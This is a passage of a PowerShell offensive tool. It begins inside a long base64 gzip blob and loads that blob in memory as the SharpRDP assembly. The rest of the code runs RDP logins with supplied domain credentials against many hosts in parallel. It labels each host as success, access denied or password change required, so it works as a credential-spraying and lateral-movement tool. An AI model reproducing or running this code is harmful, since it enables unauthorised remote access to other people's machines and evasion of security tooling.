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"))
    $decompressed = New-Object IO.Compression.GzipStream($a,[IO.Compression.CoMPressionMode]::DEComPress)
    $output = New-Object System.IO.MemoryStream
    $decompressed.CopyTo( $output )
    [byte[]] $byteOutArray = $output.ToArray()
    $RAS = [System.Reflection.Assembly]::Load($byteOutArray)
    $OldConsoleOut = [Console]::Out
    $StringWriter = New-Object IO.StringWriter
    [Console]::SetOut($StringWriter)

    [SharpRDP.Program]::Main($Command.Split(" "))

    [Console]::SetOut($OldConsoleOut)
    $Results = $StringWriter.ToString()
    $Results
}

function Display-ComputerStatus {
    param (
        [string]$ComputerName,
        [string]$OS,
        [System.ConsoleColor]$statusColor = 'White',
        [string]$statusSymbol = "",
        [string]$statusText = "",
        [int]$NameLength,
        [int]$OSLength
    )

    # Prefix
    Write-Host "RDP " -ForegroundColor Yellow -NoNewline
    Write-Host "   " -NoNewline
    
    # Resolve IP
    $IP = $null
    $Ping = New-Object System.Net.NetworkInformation.Ping 
    $Result = $Ping.Send($ComputerName, 15)
    if ($Result.Status -eq 'Success') {
    $IP = $Result.Address.IPAddressToString
    Write-Host ("{0,-16}" -f $IP) -NoNewline
    } else {Write-Host ("{0,-16}" -f $IP) -NoNewline}
    
    # Display ComputerName and OS
    Write-Host ("{0,-$NameLength}" -f $ComputerName) -NoNewline
    Write-Host "   " -NoNewline
    Write-Host ("{0,-$OSLength}" -f $OS) -NoNewline
    Write-Host "   " -NoNewline

    # Display status symbol and text
    Write-Host $statusSymbol -ForegroundColor $statusColor -NoNewline
    Write-Host $statusText
}


if ($LocalAuth){$Domain = $ComputerName}
if ($Password -ne ""){$result = Invoke-SharpRDP -Command "username=$Domain\$Username password=$Password computername=$ComputerName command='hostname'"}
           
            try {$result = $result.Trim()} catch {}

            $SuccessStatus = @('Success', 'STATUS_PASSWORD_MUST_CHANGE', 'LOGON_FAILED_UPDATE_PASSWORD', 'ARBITRATION_CODE_BUMP_OPTIONS', 'ARBITRATION_CODE_CONTINUE_LOGON', 'ARBITRATION_CODE_CONTINUE_TERMINATE', 'ARBITRATION_CODE_NOPERM_DIALOG', 'ARBITRATION_CODE_REFUSED_DIALOG', 'ARBITRATION_CODE_RECONN_OPTIONS')
            $DeniedStatus = @('ERROR_CODE_ACCESS_DENIED', 'LOGON_FAILED_BAD_PASSWORD', 'LOGON_FAILED_OTHER', 'LOGON_WARNING', 'STATUS_LOGON_FAILURE', 'SSL_ERR_LOGON_FAILURE', 'disconnectReasonByServer', 'disconnectReasonRemoteByUser')
            $PwChangeStatus = @('SSL_ERR_PASSWORD_MUST_CHANGE')
            $ToDStatus = @('STATUS_ACCOUNT_RESTRICTION')

switch ($result) {
    "Unable to connect" {continue}

    { $SuccessStatus -contains $_ } {
        Display-ComputerStatus -ComputerName $ComputerName -OS $OS -statusColor "Green" -statusSymbol "[+] " -statusText "SUCCESS" -NameLength $NameLength -OSLength $OSLength
        continue
    }

    { $DeniedStatus -contains $_ } {
        if ($SuccessOnly){Continue}
        Display-ComputerStatus -ComputerName $ComputerName -OS $OS -statusColor "Red" -statusSymbol "[-] " -statusText "ACCESS DENIED" -NameLength $NameLength -OSLength $OSLength
        continue
    }
    
    { $PwChangeStatus -contains $_ } {
        if ($SuccessOnly){continue}
        Display-ComputerStatus -ComputerName $ComputerName -OS $OS -statusColor "Magenta" -statusSymbol "[/] " -statusText "PASSWORD CHANGE REQUIRED" -NameLength $NameLength -OSLength $OSLength
        continue
    }

    { $ToDStatus -contains $_ } {
        Display-ComputerStatus -ComputerName $ComputerName -OS $OS -statusColor "Green" -statusSymbol "[+] " -statusText "SUCCESS - ACCOUNT RESTRICTION" -NameLength $NameLength -OSLength $OSLength
        continue
    }

    default {
        if ($SuccessOnly){continue}
        Display-ComputerStatus -ComputerName $ComputerName -OS $OS -statusColor "Yellow" -statusSymbol "[*] " -statusText "$_" -NameLength $NameLength -OSLength $OSLength
        continue
    }
}
   


        }

            while (($RDPJobs | Where-Object { $_.State -eq 'Running' }).Count -ge $MaxConcurrentJobs) {
            Start-Sleep -Milliseconds 100
}

$RDPJob = Start-Job -ScriptBlock $ScriptBlock -ArgumentList $OS, $ComputerName, $Domain, $Username, $Password, $NameLength, $OSLength, $LocalAuth, $SuccessOnly
        [array]$RDPJobs += $RDPJob

        # Check if the maximum number of concurrent jobs has been reached
        if ($RDPJobs.Count -ge $MaxConcurrentJobs) {
            do {
                # Wait for any job to complete
                $JobFinished = $null
                foreach ($Job in $RDPJobs) {
                    if ($Job.State -eq 'Completed') {
                        $JobFinished = $Job
                        break
                    }
                }

                if ($JobFinished) {
                    # Retrieve the job result and remove it from the job list
                    $Result = Receive-Job -Job $JobFinished
                    # Process the result as needed
                    $Result

                    $RDPJobs = $RDPJobs | Where-Object { $_ -ne $JobFinished }
                    Remove-Job -Job $JobFinished -Force -ErrorAction "SilentlyContinue"
                }
            }
            until (-not $JobFinished)
        }
    }

    # Wait for any remaining jobs to complete
    $RDPJobs | ForEach-Object {
        $JobFinished = $_ | Wait-Job -Timeout "15"

        if ($JobFinished) {
            # Retrieve the job result and remove it from the job list
